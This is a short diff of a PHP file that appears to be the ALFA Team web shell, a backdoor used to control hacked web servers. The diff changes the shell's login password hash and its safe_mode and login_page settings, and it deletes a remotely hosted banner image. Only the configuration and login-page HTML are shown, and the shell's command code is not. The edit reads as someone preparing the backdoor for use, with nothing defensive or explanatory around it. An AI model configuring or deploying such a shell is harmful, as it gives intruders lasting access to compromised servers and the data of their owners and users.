@@ -1,9 +1,10 @@
 <?php
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
-    'safe_mode' => '0',
-    'login_page' => '403',
+    'password' => '56aed7e7485ff03d5605b885b86e947e',//md5(ehsan)
+    'safe_mode' => '1',
+    'login_page' => 'gui',
     'show_icons' => '1',
     'post_encryption' => false,
     'cgi_api' => true,
@@ -526,7 +527,6 @@ body{background: black;}
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title></title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/bosunia/df/main/dp.jpg" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b></b></font></th></tr>
